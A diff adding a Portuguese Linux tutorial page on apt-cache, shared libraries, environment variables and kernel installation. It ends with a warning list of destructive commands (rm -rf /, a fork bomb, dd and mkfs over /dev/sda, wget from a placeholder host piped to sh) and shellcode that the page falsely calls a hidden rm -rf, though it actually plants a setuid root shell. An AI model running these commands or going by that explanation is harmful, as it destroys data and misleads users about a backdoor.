@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8"/>
+        <link rel="icon" href="imagens/favicon.ico"/>
+        <title>Aprenda Linux</title>
+        <link rel="stylesheet" href="css/estilo.css"/>
+    </head>
+    <body>
+        <div>
+            <header>
+                <h1>Aprenda Linux</h1>
+                <menu>
+                    <li><a href="index.html">Página Inicial</a></li>
+                    <li><a href="contato.html">Contato!</a></li>
+                    <li><a href="tudo-sobre-linux-1.html">Tudo sobre Linux Parte 1!</a></li>
+                    <li><a href="tudo-sobre-linux-2.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Linux Parte 2!</a></li>
+                    <li><a href="tudo-sobre-linux-3.html">Tudo sobre Linux Parte 3!</a></li>
+                    <li><a href="tudo-sobre-linux-4.html">Tudo sobre Linux Parte 4!</a></li>
+                    <li><a href="tudo-sobre-linux-5.html">Tudo sobre Linux Parte 5!</a></li>
+                    <li><a href="tudo-sobre-linux-6.html">Tudo sobre Linux Parte 6!</a></li>
+                </menu>
+            </header>
+            
+<h2>Tudo sobre Linux Parte 2</h2>
+
+<h3>Apt-Cache - Manipular e Obter Informações Sobre os Pacotes no Cache do Apt</h3>
+
+<p>O apt-cache é um comando utilizado para manipular e obter informações sobre os pacotes no cache do apt.</p>
+
+<p>Veja alguns exemplos:</p>
+
+<ul>
+    <li><code>apt-cache pkgnames</code> - Mostra os nomes de todos os pacotes no cache.</li>
+    <li><code>apt-cache stats</code> - Mostra algumas estatísticas básicas.</li>
+    <li><code>apt-cache dump</code> - Mostra um despejo do cache inteiro.</li>
+</ul>
+
+<p>Podemos digitar assim para vermos a paginação aos poucos (para sair digite q):</p>
+
+<pre>
+<code>
+apt-cache pkgnames | less
+</code>
+</pre>
+
+<p>Para ver o filtro com itens específicos:</p>
+
+<pre>
+<code>
+apt-cache pkgnames | grep fonts
+</code>
+</pre>
+
+<p>E juntar os dois:</p>
+
+<pre>
+<code>
+apt-cache pkgnames | grep fonts | less
+</code>
+</pre>
+
+<p>O less pode ser usado em outros comandos:</p>
+
+<pre>
+<code>
+apt-cache dump | less
+</code>
+</pre>
+
+<p>Outros exemplos de uso:</p>
+
+<ul>
+    <li><code>apt-cache search palavrachave</code> - Mostra todos os pacotes relacionados com a palavra-chave.</li>
+    <li><code>apt-cache show pacote</code> - Mostra uma breve descrição sobre um pacote em particular.</li>
+    <li><code>apt-cache showpkg pacote</code> - Mostra uma informação mais geral sobre o pacote.</li>
+    <li><code>apt-cache depends pacote</code> - Mostra de quais pacotes o pacote especificado depende.</li>
+</ul>
+
+<p>Por exemplo:</p>
+
+<pre>
+<code>
+apt-cache search atari
+
+apt-cache show stella
+
+apt-cache showpkg stella
+
+apt-cache depends stella
+</code>
+</pre>
+
+<p>PS: Podemos também usar apenas <code>apt</code> no lugar de apt-cache.</p>
+
+<h3>Gerenciamento de Bibliotecas Compartilhadas no Linux (ldd, ldconfig, ld.so)</h3>
+
+<p>O comando ldd exibe as bibliotecas compartilhadas requeridas por cada um dos programas listados na sua linha de comando, trazendo o nome da biblioteca e o local onde se espera encontrá-la.</p>
+
+<p>Para consultar a versão do ldd, digite <code>ldd --version</code>.</p>
+
+<p>Para começar, digite isso para vermos as bibliotecas do programa ls:</p>
+
+<pre>
+<code>
+ldd /bin/ls
+</code>
+</pre>
+
+<p>Os programas executáveis dinamicamente vinculados são examinados, no momento da execução, pelo vinculador dinâmico de objetos compartilhados ld.so.</p>
+
+<p>Ele procura por dependências no executável que está sendo carregado e tenta satisfazer vínculos a bibliotecas compartilhadas de sistema que não estejam resolvidos. Se ele não encontrar uma biblioteca, o programa poderá não rodar.</p>
+
+<p>ld.so pode procurar pelos diretórios que contém bibliotecas na variável <code>LD_LIBRARY_PATH</code> ou as bibliotecas são procuradas em um índice de nomes e localizações de bibliotecas (binário) chamado /etc/ld.so.cache.</p>
+
+<p>Para adicionar novas entradas ao cache, adicione o diretório que contém as bibliotecas ao arquivo /etc/ld.so.conf e atualize o cache com o comando <code>ldconfig</code>.</p>
+
+<p>Digite esses comandos:</p>
+
+<pre>
+<code>
+cat /etc/ld.so.conf
+
+ldconfig
+</code>
+</pre>
+
+<p>O ldconfig configura ligações em tempo de execução do ligador dinâmico (ld.so). Cria os links e cache necessários para as bibliotecas compartilhadas mais recentes encontradas nos diretórios especificados na CLI, no arquivo /etc/ld.so.conf e nos diretórios /lib e /usr/lib.</p>
+
+<p>O ldconfig deve ser sempre executado após a instalação de uma nova biblioteca compartilhada. O comando <code>ldconfig -p</code> examina o conteúdo do cache de bibliotecas ls.so.cache, e o <code>ldconfig</code> reconstrói o cache incluindo as atualizações realizadas em /etc/ld.so.conf.</p>
+
+<p>Na variável de ambiente LD_LIBRARY_PATH contém uma lista de diretórios separados por : onde o sistema irá procurar por determinada biblioteca dinâmica (*.so). Quando um programa precisa de uma biblioteca, o sistema a procura nos diretórios listados em LD_LIBRARY_PATH, depois no arquivo de cache /etc/ld.so.cache e então nos diretórios /lib e /usr/lib. Para visualizar o conteúdo da variável de ambiente, use o comando <code>echo $LD_LIBRARY_PATH</code>. Ele deverá retornar <code>/usr/local/lib/:/usr/lib/:/usr/lib64/</code> se estiver configurado corretamente. Caso não retorne, coloque a variável com esses valores no arquivo <code>/etc/bash.bashrc</code>.</p>
+
+<p>No arquivo /etc/ld.so.conf contém uma lista de diretórios nos quais podem se procurar por bibliotecas, configurável pelo usuário. E no arquivo /etc/ld.so.cache contém uma lista ordenada de bibliotecas encontradas nos diretórios encontrados em /etc/ld.so.conf. Não é legível por humanos e não deve ser editado, pois é binário.</p>
+
+<p>As bibliotecas compartilhadas funcionam assim: O usuário executa um programa qualquer. O programa ld.so é invocado para descobrir as dependências do programa do usuário e vincular as bibliotecas necessárias. Para isso o ld.so consulta diversos diretórios que contém as bibliotecas e a variável de ambiente LD_LIBRARY_PATH. Ao encontrar as dependências requeridas, efetua a vinculação e assim as funções da biblioteca ficam disponíveis para o programa chamador e ele é então executado. O ld.so também pode consultar um cache de nomes de bibliotecas e caminhos chamado /etc/ld.so.cache (não legível por humanos). É Possível acrescentes mais caminhos de diretórios ao ld.so.cache editando-se o arquivo de configuração /etc/ld.so.conf. Caso o /etc/ld.so.conf seja editado, rode o programa ldconfi logo após para atualizar o cache com as novas configurações.</p>
+
+<h3>Variáveis de Ambiente no Linux e Comandos echo, env e export</h3>
+
+<p>As variáveis de ambiente permitem mudar o shell de várias formas para adaptá-lo às necessidades do usuário. Esses são alguns exemplos de variáveis de ambiente:</p>
+
+<ul>
+    <li><code>PS1</code> - Prompt da linha de comandos.</li>
+    <li><code>HOME</code> - Diretório /home de um usuário.</li>
+    <li><code>PATH</code> - Lista de diretórios vasculhados quando um comando é executado.</li>
+</ul>
+
+<p>Para verificar o conteúdo de uma variável de ambiente, podemos fazer assim:</p>
+
+<ul>
+    <li><code>env</code> - Todas as variáveis.</li>
+    <li><code>echo $NOMEDAVARIAVEL</code> - Variável específica.</li>
+</ul>
+
+<p>Para adicionar um caminho à variável PATH, digitamos <code>PATH=$PATH:/novocaminho</code>. Para criar uma variável de ambiente, digitamos <code>NOMEDAVARIAVEL=meuconteudo</code>. As variáveis assim criadas possuem escopo local válidas apenas no shell atual. Para tornar seu escopo global, exporte-as com o comando <code>export</code>.</p>
+
+<p>Digite esses comandos:</p>
+
+<pre>
+<code>
+FRUTA=laranja
+
+echo $FRUTA
+
+export FRUTA
+
+env
+
+mkdir /testevar
+
+PATH=$PATH:/minhavar
+
+env
+</code>
+</pre>
+
+<p>PS: Para tornar as variáveis de ambiente permanente no sistema, coloque elas no final do arquivo localizado em <code>~/.bashrc</code> (para usuário) ou <code>/etc/bash.bashrc</code> (para todo o sistema), como por exemplo <code>export PATH=$PATH:/caminho</code>. Para adicionar um caminho ao path, adicione o caminho com dois pontos no arquivo <code>/etc/environment</code>, da forma <code>:/caminho</code>.</p>
+
+<p>Para remover uma variável exportada, digite <code>unset $variavel</code>.</p>
+
+<h3>Instalar Novo Kernel no Sistema</h3>
+
+<p>Antes de instalar o novo kernel, faça o back-up dos arquivos do seu Linux.</p>
+
+<p>Para descobrirmos a versão atual do kernel, digite <code>uname -r</code>. Para vermos os kernels disponíveis digitamos <code>apt-cache search linux-image</code>.</p>
+
+<p>Para instalar, basta isso, substituindo pelo kernel desejado:</p>
+
+<pre>
+<code>
+apt-get install linux-image-2.6.32.5-xen-686
+</code>
+</pre>
+
+<p>No final, ele ficará com dois kernels, após um reinício da máquina e o uso pelo novo kernel, podemos excluir o antigo pelo apt-get remove.</p>
+
+<h3>Comandos que Podem Danificar seu Sistema Linux</h3>
+
+<p>Há uma série de comandos e combinações de comandos que são extremamente perigosos em seu ambiente Linux, especialmente se você utiliza o sistema como usuário root para tarefas normais. É importante conhecer alguns desses comandos para evitar problemas sérios em seu sistema.</p>
+
+<p>O comando <code>rm -rf</code> é uma forma rápida de apagar uma pasta e seu conteúdo. Mas qualquer erro pode resultar em perda de dados, geralmente irrecuperável. Vejamos algumas opções:</p>
+
+<ul>
+    <li><code>rm -r</code> - Apaga uma pasta recursivamente.</li>
+    <li><code>rm -f</code> - Remover arquivos somente-leitura sem perguntar.</li>
+    <li><code>rm -rf / </code> - Força a exclusão de tudo no diretório raiz.</li>
+    <li><code>rm -rf *</code> - Força a exclusão de tudo no diretório atual.</li>
+    <li><code>rm -rf .</code> - Força a exclusão do diretório atual e suas sub-pastas.</li>
+</ul>
+
+<p>PS: Alguns sistemas tem proteção própria contra o uso errado desse comando, mas pode usar algo como <code>rm -rf / --no-preserve-root</code> para apagar o sistema.</p>
+
+<p>O comando <code>:(){ :|:& };:</code> é uma fork bomb, que cria vários processos até travar o sistema. Ele funciona definindo uma função chamada ":", a qual chama a si mesma duas vezes, uma em foreground (primeiro plano) e outra em background.</p>
+
+<p>O comando <code>mv nomedoarquivo /dev/null</code> moverá o arquivo especificado para o dispositivo /dev/null. No Linux, o dispositivo /dev/null ou null é um arquivo especial que descarta todos os dados escritos nele e informa que a operação de escrita foi bem-sucedida.</p>
+
+<p>O comando <code>wget http://fontemaliciosa -O- | sh</code> irá baixar um script da Internet, o qual pode estar em uma fonte maliciosa de dados, e então o executará por meio do shell sh.</p>
+
+<p>O comando <code>&gt; nomedoarquivo</code> pode ser usado para apagar o conteúdo de um arquivo. Se esse comando for executado inadvertidamente, como por exemplo "> arquivo.conf", todo o conteúdo do arquivo arquivo.conf será sobrescrito e, dessa forma, perdido.</p>
+
+<p>O comando <code>dd if=/dev/random of=/dev/sda</code> irá apagar o dispositivo de blocos sda e escreverá dados aleatórios nele. Como seu sistema provavelmente está instalado nesse dispositivo, estará perdido e irrecuperável.</p>
+
+<p>O comando <code>mkfs.ext3 /dev/sda</code> formata o dispositivo de blocos sda e então o disco terá seu conteúdo totalmente apagado, como se fosse um disco novo.</p>
+
+<p>E também tem esse código em hexadecimal aqui:</p>
+
+<pre>
+<code>
+char esp[] __attribute__ ((section(".text”))) /* e.s.p
+release */
+= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+"cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;";
+</code>
+</pre>
+
+<p>Essa sequência de caracteres toda nada mais é que o comando rm -rf, porém representado em códigos hexadecimais, de modo a enganar quem não conheça esse tipo de representação. Se esse comando for executado no terminal, a partição principal do sistema será totalmente apagada.</p>
+
+<p>Uma coisa boa no Linux é que muitos desses comandos acima só são executados como root. Mas alguns sistemas, como o Kali e principalmente os que só usam a linha de comando, geralmente entram como root. Alguns desses comandos o próprio sistema já protege contra eles.</p>
+
+<ul>
+    <li><a href="tudo-sobre-linux-1.html">Parte Anterior da Matéria!</a></li>
+    <li><a href="tudo-sobre-linux-3.html">Continuação da Matéria!</a></li>
+</ul>
+
+        </div>
+    </body>
+</html>
